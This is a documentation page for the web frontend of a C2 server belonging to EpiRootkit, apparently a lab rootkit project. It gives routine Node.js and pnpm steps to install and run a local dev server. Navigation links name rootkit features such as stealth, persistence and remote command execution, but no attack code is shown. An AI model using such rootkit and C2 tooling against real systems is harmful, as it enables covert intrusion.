<!doctype html><html lang=en><head><meta charset=utf-8><title>Installation & Setup | Tux Fan Club Docs</title>
<meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="How to install and launch the Web UI."><meta name=keywords content="Documentation,Hugo,Hugo Theme,Bootstrap"><meta name=author content="Colin Wilson - Lotus Labs"><meta name=email content="support@aigis.uk"><meta name=website content="https://lotusdocs.dev"><meta name=Version content="v0.1.0"><link rel=icon href=/favicon.ico sizes=any><link rel=icon type=image/svg+xml href=/favicon.svg><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest crossorigin=use-credentials href=/site.webmanifest><meta property="og:title" content="Installation & Setup"><meta property="og:description" content="How to install and launch the Web UI."><meta property="og:type" content="article"><meta property="og:url" content="/docs/06-web-ui/installation/"><meta property="og:image" content="/opengraph/card-base-2_hu_21089e703b5b4c99.png"><meta property="article:section" content="docs"><meta property="article:modified_time" content="2025-05-26T02:07:50+02:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="/opengraph/card-base-2_hu_21089e703b5b4c99.png"><meta name=twitter:title content="Installation & Setup"><meta name=twitter:description content="How to install and launch the Web UI."><link rel=alternate type=application/atom+xml title="Atom feed for Tux Fan Club Docs" href=/index.xml><script>(()=>{var t=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,e=localStorage.getItem("theme");t&&e===null&&(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")),t&&e==="dark"&&document.documentElement.setAttribute("data-dark-mode",""),e==="dark"&&document.documentElement.setAttribute("data-dark-mode","")})()</script><script type=text/javascript src=/docs/js/flexsearch.bundle.min.249548594cb6843f3060a3cdd3043799676c59ce8db83358a3fc2e4d20598d05dfa6ce4994805d2835cb33b54dc9b9e7.js integrity=sha384-JJVIWUy2hD8wYKPN0wQ3mWdsWc6NuDNYo/wuTSBZjQXfps5JlIBdKDXLM7VNybnn crossorigin=anonymous></script><link rel=preconnect href=https://fonts.gstatic.com/><link rel=preconnect href=https://fonts.gstatic.com/ crossorigin><link href="https://fonts.googleapis.com/css?family=Inter:300,400,600,700|Fira+Code:500,700&display=block" rel=stylesheet><link rel=stylesheet href=/docs/scss/style.min.47627c508718021a8811f17bfd419041ce97729127a3db8f6bcf7c26c29fbacf37e002e618d60350aae90d89464e8447.css integrity=sha384-R2J8UIcYAhqIEfF7/UGQQc6XcpEno9uPa898JsKfus834ALmGNYDUKrpDYlGToRH crossorigin=anonymous></head><body><div class=content><div class="page-wrapper toggled"><nav id=sidebar class=sidebar-wrapper><div class=sidebar-brand><a href=/ aria-label=HomePage alt=HomePage><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></a></div><div class=sidebar-content style="height:calc(100% - 131px)"><ul class=sidebar-menu><li><a class=sidebar-root-link href=/docs/01-introduction/presentation/><i class="material-icons me-2">code</i>
Presentation</a></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">code</i>
Setup</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/02-setup/environment/>Initial Setup & Installation</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/vm-installation/>VM Installation & Verification</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/attacking-vm-setup/>Attacking VM Setup</a></li><li><a class=sidebar-nested-link href=/docs/02-setup/victim-vm-setup/>Victim VM Setup</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">notes</i>
Attacking Program (C2 Server)</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/03-attacking-program/overview/>README</a></li><li><a class=sidebar-nested-link href=/docs/03-attacking-program/commands/>Command Reference</a></li></ul></div></li><li class=sidebar-dropdown><button class=btn>
<i class="material-icons me-2">shield</i>
EpiRootkit</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/overview/>EpiRootkit Overview</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/configuration-justifications/>Configuration Justifications</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/connection-authentication/>Connection & Authentication</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/deployment/>Build & Deployment</a></li><li class="sidebar-dropdown nested"><button class=btn>
Features</button><div class=sidebar-submenu><ul><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/command-execution/>Command Execution</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/file-transfer/>File Transfer</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/hiding/>Stealth & Hiding</a></li><li><a class=sidebar-nested-link href=/docs/04-epirootkit/features/persistence/>Persistence</a></li></ul></div></li></ul></div></li><li class="sidebar-dropdown current active"><button class=btn>
<i class="material-icons me-2">monitor</i>
Web UI (C2 Frontend)</button><div class="sidebar-submenu d-block"><ul><li><a class=sidebar-nested-link href=/docs/06-web-ui/overview/>README</a></li><li class=current><a class=sidebar-nested-link href=/docs/06-web-ui/installation/>Installation & Setup</a></li><li><a class=sidebar-nested-link href=/docs/06-web-ui/i3/>i3 like interface</a></li></ul></div></li><li><a class=sidebar-root-link href=/docs/07-bonuses/wlkom-ctf/><i class="material-icons me-2">savings</i>
Tux Fan Club: Chasse au Tr√©sor Pirate</a></li><li><a class=sidebar-root-link href=/docs/08-remerciements/thankyou/><i class="material-icons me-2">favorite</i>
Un dernier mot</a></li></ul></div><ul class="sidebar-footer list-unstyled mb-0"></ul></nav><main class="page-content bg-transparent"><div id=top-header class="top-header d-print-none"><div class="header-bar d-flex justify-content-between"><div class="d-flex align-items-center"><a href=/ class="logo-icon me-3" aria-label=HomePage alt=HomePage><div class=small><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div><div class=big><svg id="Layer_1" viewBox="0 0 250 250"><path d="m143 39.5c-18 0-18 18-18 18s0-18-18-18H22c-2.76.0-5 2.24-5 5v143c0 2.76 2.24 5 5 5h76c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h76c2.76.0 5-2.24 5-5V44.5c0-2.76-2.24-5-5-5h-85zM206 163c0 1.38-1.12 2.5-2.5 2.5H143c-18 0-18 18-18 18s0-18-18-18H46.5c-1.38.0-2.5-1.12-2.5-2.5V69c0-1.38 1.12-2.5 2.5-2.5H98c7.2.0 8.64 11.52 8.93 16.13.07 1.05.95 1.87 2 1.87h32.14c1.06.0 1.94-.82 2-1.87.29-4.61 1.73-16.13 8.93-16.13h51.5c1.38.0 2.5 1.12 2.5 2.5v94z" style="fill:#06f"/></svg></div></a><button id=close-sidebar class="btn btn-icon btn-soft">
<span class="material-icons size-20 menu-icon align-middle">menu</span>
</button>
<button id=flexsearch-button class="ms-3 btn btn-soft" data-bs-toggle=collapse data-bs-target=#FlexSearchCollapse aria-expanded=false aria-controls=FlexSearchCollapse>
<span class="material-icons size-20 menu-icon align-middle">search</span>
<span class="flexsearch-button-placeholder ms-1 me-2 d-none d-sm-block">Search</span><div class="d-none d-sm-block"><span class=flexsearch-button-keys><kbd class=flexsearch-button-cmd-key><svg width="44" height="15"><path d="M2.118 11.5A1.519 1.519.0 011 11.042 1.583 1.583.0 011 8.815a1.519 1.519.0 011.113-.458h.715V6.643h-.71A1.519 1.519.0 011 6.185 1.519 1.519.0 01.547 5.071 1.519 1.519.0 011 3.958 1.519 1.519.0 012.118 3.5a1.519 1.519.0 011.114.458A1.519 1.519.0 013.69 5.071v.715H5.4V5.071A1.564 1.564.0 016.976 3.5 1.564 1.564.0 018.547 5.071 1.564 1.564.0 016.976 6.643H6.261V8.357h.715a1.575 1.575.0 011.113 2.685 1.583 1.583.0 01-2.227.0A1.519 1.519.0 015.4 9.929V9.214H3.69v.715a1.519 1.519.0 01-.458 1.113A1.519 1.519.0 012.118 11.5zm0-.857a.714.714.0 00.715-.714V9.214H2.118a.715.715.0 100 1.429zm4.858.0a.715.715.0 100-1.429H6.261v.715a.714.714.0 00.715.714zM3.69 8.357H5.4V6.643H3.69zM2.118 5.786h.715V5.071a.714.714.0 00-.715-.714.715.715.0 00-.5 1.22A.686.686.0 002.118 5.786zm4.143.0h.715a.715.715.0 00.5-1.22.715.715.0 00-1.22.5z" fill="currentcolor"/><path d="M12.4 11.475H11.344l3.879-7.95h1.056z" fill="currentcolor"/><path d="M25.073 5.384l-.864.576a2.121 2.121.0 00-1.786-.923 2.207 2.207.0 00-2.266 2.326 2.206 2.206.0 002.266 2.325 2.1 2.1.0 001.782-.918l.84.617a3.108 3.108.0 01-2.622 1.293 3.217 3.217.0 01-3.349-3.317 3.217 3.217.0 013.349-3.317A3.046 3.046.0 0125.073 5.384z" fill="currentcolor"/><path d="M30.993 5.142h-2.07v5.419H27.891V5.142h-2.07V4.164h5.172z" fill="currentcolor"/><path d="M34.67 4.164c1.471.0 2.266.658 2.266 1.851.0 1.087-.832 1.809-2.134 1.855l2.107 2.691h-1.28L33.591 7.87H33.07v2.691H32.038v-6.4zm-1.6.969v1.8h1.572c.832.0 1.22-.3 1.22-.918s-.411-.882-1.22-.882z" fill="currentcolor"/><path d="M42.883 10.561H38.31v-6.4h1.033V9.583h3.54z" fill="currentcolor"/></svg>
</kbd><kbd class=flexsearch-button-key><svg width="15" height="15"><path d="M5.926 12.279H4.41L9.073 2.721H10.59z" fill="currentcolor"/></svg></kbd></span></div></button></div><div class="d-flex align-items-center"><ul class="list-unstyled mb-0"><li class="list-inline-item mb-0"><a href=https://github.com/KazeTachinuu/epirootkit-docs alt=github rel="noopener noreferrer" target=_blank><div class="btn btn-icon btn-default border-0"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>GitHub</title><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37.0 00-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44.0 0020 4.77 5.07 5.07.0 0019.91 1S18.73.65 16 2.48a13.38 13.38.0 00-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07.0 005 4.77 5.44 5.44.0 003.5 8.55c0 5.42 3.3 6.61 6.44 7A3.37 3.37.0 009 18.13V22"/></svg></div></a></li></ul><button id=mode class="btn btn-icon btn-default ms-2" type=button aria-label="Toggle user interface mode">
<span class=toggle-dark><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable dark mode</title><path d="M24 42q-7.5.0-12.75-5.25T6 24t5.25-12.75T24 6q.4.0.85.025.45.025 1.15.075-1.8 1.6-2.8 3.95t-1 4.95q0 4.5 3.15 7.65Q28.5 25.8 33 25.8q2.6.0 4.95-.925T41.9 22.3q.05.6.075.975Q42 23.65 42 24q0 7.5-5.25 12.75T24 42zm0-3q5.45.0 9.5-3.375t5.05-7.925q-1.25.55-2.675.825Q34.45 28.8 33 28.8q-5.75.0-9.775-4.025T19.2 15q0-1.2.25-2.575t.9-3.125q-4.9 1.35-8.125 5.475Q9 18.9 9 24q0 6.25 4.375 10.625T24 39zm-.2-14.85z"/></svg>
</span><span class=toggle-light><svg height="30" width="30" viewBox="0 0 48 48" fill="currentcolor"><title>Enable light mode</title><path d="M24 31q2.9.0 4.95-2.05T31 24t-2.05-4.95T24 17t-4.95 2.05T17 24t2.05 4.95T24 31zm0 3q-4.15.0-7.075-2.925T14 24t2.925-7.075T24 14t7.075 2.925T34 24t-2.925 7.075T24 34zM3.5 25.5q-.65.0-1.075-.425Q2 24.65 2 24t.425-1.075Q2.85 22.5 3.5 22.5h5q.65.0 1.075.425Q10 23.35 10 24t-.425 1.075T8.5 25.5zm36 0q-.65.0-1.075-.425Q38 24.65 38 24t.425-1.075T39.5 22.5h5q.65.0 1.075.425Q46 23.35 46 24t-.425 1.075-1.075.425zM24 10q-.65.0-1.075-.425Q22.5 9.15 22.5 8.5v-5q0-.65.425-1.075Q23.35 2 24 2t1.075.425T25.5 3.5v5q0 .65-.425 1.075Q24.65 10 24 10zm0 36q-.65.0-1.075-.425T22.5 44.5v-5q0-.65.425-1.075Q23.35 38 24 38t1.075.425.425 1.075v5q0 .65-.425 1.075Q24.65 46 24 46zM12 14.1l-2.85-2.8q-.45-.45-.425-1.075.025-.625.425-1.075.45-.45 1.075-.45t1.075.45L14.1 12q.4.45.4 1.05.0.6-.4 1-.4.45-1.025.45T12 14.1zm24.7 24.75L33.9 36q-.4-.45-.4-1.075t.45-1.025q.4-.45 1-.45t1.05.45l2.85 2.8q.45.45.425 1.075-.025.625-.425 1.075-.45.45-1.075.45t-1.075-.45zM33.9 14.1q-.45-.45-.45-1.05.0-.6.45-1.05l2.8-2.85q.45-.45 1.075-.425.625.025 1.075.425.45.45.45 1.075t-.45 1.075L36 14.1q-.4.4-1.025.4t-1.075-.4zM9.15 38.85q-.45-.45-.45-1.075t.45-1.075L12 33.9q.45-.45 1.05-.45.6.0 1.05.45.45.45.45 1.05.0.6-.45 1.05l-2.8 2.85q-.45.45-1.075.425-.625-.025-1.075-.425zM24 24z"/></svg></span></button></div></div><div class=collapse id=FlexSearchCollapse><div class=flexsearch-container><div class=flexsearch-keymap><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow down" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 3.5v8m3-3-3 3-3-3"/></g></svg></kbd>
<kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Arrow up" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M7.5 11.5v-8m3 3-3-3-3 3"/></g></svg></kbd>
<span class=flexsearch-key-label>to navigate</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Enter key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M12 3.53088v3c0 1-1 2-2 2H4m3 3-3-3 3-3"/></g></svg></kbd>
<span class=flexsearch-key-label>to select</span></li><li><kbd class=flexsearch-button-cmd-key><svg width="15" height="15" aria-label="Escape key" role="img"><g fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.2"><path d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993.0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016s1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5s-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864.0 1.6425 1.031 1.5443 2.2492h-2.956"/></g></svg></kbd>
<span class=flexsearch-key-label>to close</span></li></div><form class="flexsearch position-relative flex-grow-1 ms-2 me-2"><div class="d-flex flex-row"><input id=flexsearch class=form-control type=search placeholder=Search aria-label=Search autocomplete=off>
<button id=hideFlexsearch type=button class="ms-2 btn btn-soft">
cancel</button></div><div id=suggestions class="shadow rounded-1 d-none"></div></form></div></div></div><div class=container-fluid><div class=layout-spacing><div class="d-md-flex justify-content-between align-items-center"><nav aria-label=breadcrumb class="d-inline-block pb-2 mt-1 mt-sm-0"><ul id=breadcrumbs class="breadcrumb bg-transparent mb-0" itemscope itemtype=https://schema.org/BreadcrumbList><li class="breadcrumb-item text-capitalize active" aria-current=page itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/><i class="material-icons size-20 align-text-bottom" itemprop=name>Home</i>
</a><meta itemprop=position content='1'></li><li class="breadcrumb-item text-capitalize" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><a itemprop=item href=/docs/06-web-ui/><span itemprop=name>Web UI (C2 Frontend)</span>
</a><meta itemprop=position content='2'></li><li class="breadcrumb-item text-capitalize active" itemprop=itemListElement itemscope itemtype=https://schema.org/ListItem><span itemprop=name>Installation & Setup</span>
<meta itemprop=position content='3'></li></ul></nav></div><div class="row flex-xl-nowrap"><div class="docs-toc col-xl-3 d-xl-block"><toc><div class="fw-bold text-uppercase mb-2">On this page</div><nav id=toc><ul><li><a href=#web-ui-installation--setup>Web UI Installation & Setup</a><ul><li><a href=#1-install-nodejs-npm-and-pnpm>1. Install Node.js, npm, and pnpm</a></li><li><a href=#2-navigate-to-the-web-ui-directory>2. Navigate to the Web UI Directory</a></li><li><a href=#3-install-dependencies>3. Install Dependencies</a></li><li><a href=#4-start-the-development-server>4. Start the Development Server</a></li><li><a href=#5-troubleshooting>5. Troubleshooting</a></li><li><a href=#6-next-steps>6. Next Steps</a></li></ul></li></ul></nav></toc></div><div class="docs-toc-mobile d-print-none d-xl-none"><button id=toc-dropdown-btn class="btn-secondary dropdown-toggle" type=button data-bs-toggle=dropdown data-bs-offset=0,0 aria-expanded=false>
Table of Contents</button><nav id=toc-mobile><ul class=dropdown-menu><li><a href=#web-ui-installation--setup>Web UI Installation & Setup</a><ul><li><a href=#1-install-nodejs-npm-and-pnpm>1. Install Node.js, npm, and pnpm</a></li><li><a href=#2-navigate-to-the-web-ui-directory>2. Navigate to the Web UI Directory</a></li><li><a href=#3-install-dependencies>3. Install Dependencies</a></li><li><a href=#4-start-the-development-server>4. Start the Development Server</a></li><li><a href=#5-troubleshooting>5. Troubleshooting</a></li><li><a href=#6-next-steps>6. Next Steps</a></li></ul></li></ul></nav></div><div class="docs-content col-12 col-xl-9 mt-0"><div class="mb-0 d-flex"><i class="material-icons title-icon me-2">article</i><h1 class="content-title mb-0">Installation & Setup</h1></div><p class="lead mb-3">How to install and launch the Web UI.</p><div id=content class=main-content data-bs-spy=scroll data-bs-root-margin="0px 0px -65%" data-bs-target=#toc-mobile><div data-prismjs-copy data-prismjs-copy-success data-prismjs-copy-error><h1 id=web-ui-installation--setup>Web UI Installation & Setup <a href=#web-ui-installation--setup class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h1><blockquote><p><strong>Assumption:</strong> You are starting from a fresh Ubuntu system. Complete <a data-bs-delay='{"hide":300,"show":550}' data-bs-html=true data-bs-title="<a href='/docs/02-setup/environment/'><p>SETUP</p><strong>Initial Setup & Installation</strong><br>Prepare your host system from scratch for the EpiRootkit project.</a>" data-bs-toggle=tooltip href=/docs/02-setup/environment/>Host Environment Setup</a> first.</p></blockquote><h2 id=1-install-nodejs-npm-and-pnpm>1. Install Node.js, npm, and pnpm <a href=#1-install-nodejs-npm-and-pnpm class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><p>If not already installed, run:</p><div class=prism-codeblock><pre id=3f389ed class=language-bash>
  <code>sudo apt update
sudo apt install -y nodejs npm
sudo npm install -g pnpm</code>
  </pre></div><blockquote><div class="alert alert-info d-flex" role=alert><div class="flex-shrink-1 alert-icon"><span class="material-icons size-20 me-2">info</span></div><div class=w-100>Check your versions: Node.js v18+ and pnpm v8+ are recommended. Use <code>node -v</code> and <code>pnpm -v</code> to verify.</div></div></blockquote><h2 id=2-navigate-to-the-web-ui-directory>2. Navigate to the Web UI Directory <a href=#2-navigate-to-the-web-ui-directory class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><div class=prism-codeblock><pre id=db8fc69 class=language-bash>
  <code>cd webui</code>
  </pre></div><h2 id=3-install-dependencies>3. Install Dependencies <a href=#3-install-dependencies class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><div class=prism-codeblock><pre id=b879665 class=language-bash>
  <code>pnpm install
# Or, if you prefer npm:
npm install</code>
  </pre></div><h2 id=4-start-the-development-server>4. Start the Development Server <a href=#4-start-the-development-server class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><div class=prism-codeblock><pre id=b881346 class=language-bash>
  <code>pnpm run dev
# Or
npm run dev</code>
  </pre></div><p>Open your browser and go to <a href=http://localhost:5173 rel=external target=_blank>http://localhost:5173<svg width="16" height="16" viewBox="0 0 24 24"><path fill="currentcolor" d="M14 5c-.552.0-1-.448-1-1s.448-1 1-1h6c.552.0 1 .448 1 1v6c0 .552-.448 1-1 1s-1-.448-1-1V6.414l-7.293 7.293c-.391.39-1.024.39-1.414.0-.391-.391-.391-1.024.0-1.414L17.586 5H14zM5 7c-.552.0-1 .448-1 1v11c0 .552.448 1 1 1h11c.552.0 1-.448 1-1v-4.563c0-.552.448-1 1-1s1 .448 1 1V19c0 1.657-1.343 3-3 3H5c-1.657.0-3-1.343-3-3V8c0-1.657 1.343-3 3-3h4.563c.552.0 1 .448 1 1s-.448 1-1 1H5z"/></svg></a> (or the port shown in your terminal).</p><blockquote><div class="alert alert-warning d-flex" role=alert><div class="flex-shrink-1 alert-icon"><span class="material-icons size-20 me-2">warning</span></div><div class=w-100>The Web UI is currently frontend-only. Backend integration is planned for future releases.</div></div></blockquote><h2 id=5-troubleshooting>5. Troubleshooting <a href=#5-troubleshooting class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><ul><li>If you see errors about missing dependencies, rerun <code>pnpm install</code> or <code>npm install</code>.</li><li>If you see <code>EADDRINUSE</code>, another process is using the port. Change the port in <code>package.json</code> or stop the other process.</li><li>For permission errors, avoid running as root unless necessary.</li></ul><h2 id=6-next-steps>6. Next Steps <a href=#6-next-steps class=anchor aria-hidden=true><i class="material-icons align-middle">link</i></a></h2><ul><li>See the <a data-bs-delay='{"hide":300,"show":550}' data-bs-html=true data-bs-title="<a href='/docs/06-web-ui/overview/'><p>WEB UI (C2 FRONTEND)</p><strong>README</strong><br>A modern, user-friendly frontend for the C2 server.</a>" data-bs-toggle=tooltip href=/docs/06-web-ui/overview/>Overview</a> for features and usage tips.</li></ul></div><div class="gitinfo d-flex flex-wrap justify-content-between align-items-center opacity-85 pt-3"><div id=edit-this-page class=mt-1><a href=https://github.com/kazetachinuu/epirootkit-docs/blob/master/content/docs/06-web-ui/installation.md alt="Installation & Setup" rel="noopener noreferrer" target=_blank><span class="me-1 align-text-bottom"><svg width="20" height="20" viewBox="0 0 32 32" fill="currentcolor"><path d="M16 .396c-8.839.0-16 7.167-16 16 0 7.073 4.584 13.068 10.937 15.183.803.151 1.093-.344 1.093-.772.0-.38-.009-1.385-.015-2.719-4.453.964-5.391-2.151-5.391-2.151-.729-1.844-1.781-2.339-1.781-2.339-1.448-.989.115-.968.115-.968 1.604.109 2.448 1.645 2.448 1.645 1.427 2.448 3.744 1.74 4.661 1.328.14-1.031.557-1.74 1.011-2.135-3.552-.401-7.287-1.776-7.287-7.907.0-1.751.62-3.177 1.645-4.297-.177-.401-.719-2.031.141-4.235.0.0 1.339-.427 4.4 1.641 1.281-.355 2.641-.532 4-.541 1.36.009 2.719.187 4 .541 3.043-2.068 4.381-1.641 4.381-1.641.859 2.204.317 3.833.161 4.235 1.015 1.12 1.635 2.547 1.635 4.297.0 6.145-3.74 7.5-7.296 7.891.556.479 1.077 1.464 1.077 2.959.0 2.14-.02 3.864-.02 4.385.0.416.28.916 1.104.755 6.4-2.093 10.979-8.093 10.979-15.156.0-8.833-7.161-16-16-16z"/></svg>
</span>Edit this page</a></div></div></div><div><hr class=doc-hr><div id=doc-nav class=d-print-none><div class="row flex-xl-nowrap"><div class="col-sm-6 pt-2 doc-next"><a href=/docs/06-web-ui/overview/><div class="card h-100 my-1"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0"><i class="material-icons align-middle">navigate_before</i> README</p><p class="card-text ms-2">A modern, user-friendly ‚Ä¶</p></div></div></a></div><div class="col-sm-6 pt-2 doc-prev"><a class=ms-auto href=/docs/06-web-ui/i3/><div class="card h-100 my-1 text-end"><div class="card-body py-2"><p class="card-title fs-5 fw-semibold lh-base mb-0">i3 like interface <i class="material-icons align-middle">navigate_next</i></p><p class="card-text me-2">I hate myself, so I remade ‚Ä¶</p></div></div></a></div></div></div></div></div></div></div></div><footer class="shadow py-3 d-print-none"><div class=container-fluid><div class="row align-items-center"><div class=col><div class="text-sm-start text-center mx-md-2"><p class=mb-0>¬© 2025 Tux Fan Club. Built with <a href=https://github.com/colinwilson/lotusdocs><strong>Lotus Docs</strong></a></p></div></div></div></div></footer></main></div></div><button onclick=topFunction() id=back-to-top aria-label="Back to Top Button" class="back-to-top fs-5"><svg width="24" height="24"><path d="M12 10.224l-6.3 6.3-1.38-1.372L12 7.472l7.68 7.68-1.38 1.376z" style="fill:#fff"/></svg></button>
<script>(()=>{var e=document.getElementById("mode");e!==null&&(window.matchMedia("(prefers-color-scheme: dark)").addEventListener("change",e=>{e.matches?(localStorage.setItem("theme","dark"),document.documentElement.setAttribute("data-dark-mode","")):(localStorage.setItem("theme","light"),document.documentElement.removeAttribute("data-dark-mode"))}),e.addEventListener("click",()=>{document.documentElement.toggleAttribute("data-dark-mode"),localStorage.setItem("theme",document.documentElement.hasAttribute("data-dark-mode")?"dark":"light")}),localStorage.getItem("theme")==="dark"?document.documentElement.setAttribute("data-dark-mode",""):document.documentElement.removeAttribute("data-dark-mode"))})()</script><script src=/docs/js/bootstrap.c7927bdd82eceb076739257add3f4b0e11379da037c07d5c7110daeb6de0e3edcb2de867604550f88815157e4ec4ddb7.js integrity=sha384-x5J73YLs6wdnOSV63T9LDhE3naA3wH1ccRDa623g4+3LLehnYEVQ+IgVFX5OxN23 defer></script><script type=text/javascript src=/docs/js/bundle.min.4f60111ba6134ba40ed4d3ca8b6f30e10963c0482cd9829b9dc4a2a347bc6eaec2c1cf424c2ce632fb6d2218139f34f0.js integrity=sha384-T2ARG6YTS6QO1NPKi28w4QljwEgs2YKbncSio0e8bq7Cwc9CTCzmMvttIhgTnzTw crossorigin=anonymous defer></script><script type=module>
    var suggestions = document.getElementById('suggestions');
    var search = document.getElementById('flexsearch');

    const flexsearchContainer = document.getElementById('FlexSearchCollapse');

    const hideFlexsearchBtn = document.getElementById('hideFlexsearch');

    const configObject = { toggle: false }
    const flexsearchContainerCollapse = new Collapse(flexsearchContainer, configObject) 

    if (search !== null) {
        document.addEventListener('keydown', inputFocus);
        flexsearchContainer.addEventListener('shown.bs.collapse', function () {
            search.focus();
        });
        
        var topHeader = document.getElementById("top-header");
        document.addEventListener('click', function(elem) {
            if (!flexsearchContainer.contains(elem.target) && !topHeader.contains(elem.target))
                flexsearchContainerCollapse.hide();
        });
    }

    hideFlexsearchBtn.addEventListener('click', () =>{
        flexsearchContainerCollapse.hide()
    })

    function inputFocus(e) {
        if (e.ctrlKey && e.key === '/') {
            e.preventDefault();
            flexsearchContainerCollapse.toggle();
        }
        if (e.key === 'Escape' ) {
            search.blur();
            
            flexsearchContainerCollapse.hide();
        }
    };

    document.addEventListener('click', function(event) {

    var isClickInsideElement = suggestions.contains(event.target);

    if (!isClickInsideElement) {
        suggestions.classList.add('d-none');
    }

    });

    


    document.addEventListener('keydown',suggestionFocus);

    function suggestionFocus(e) {
    const suggestionsHidden = suggestions.classList.contains('d-none');
    if (suggestionsHidden) return;

    const focusableSuggestions= [...suggestions.querySelectorAll('a')];
    if (focusableSuggestions.length === 0) return;

    const index = focusableSuggestions.indexOf(document.activeElement);

    if (e.key === "ArrowUp") {
        e.preventDefault();
        const nextIndex = index > 0 ? index - 1 : 0;
        focusableSuggestions[nextIndex].focus();
    }
    else if (e.key === "ArrowDown") {
        e.preventDefault();
        const nextIndex= index + 1 < focusableSuggestions.length ? index + 1 : index;
        focusableSuggestions[nextIndex].focus();
    }

    }

    


    (function(){

    var index = new FlexSearch.Document({
        
        tokenize: "forward",
        minlength:  0 ,
        cache:  100 ,
        optimize:  true ,
        document: {
        id: 'id',
        store: [
            "href", "title", "description"
        ],
        index: ["title", "description", "content"]
        }
    });


    


    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
    
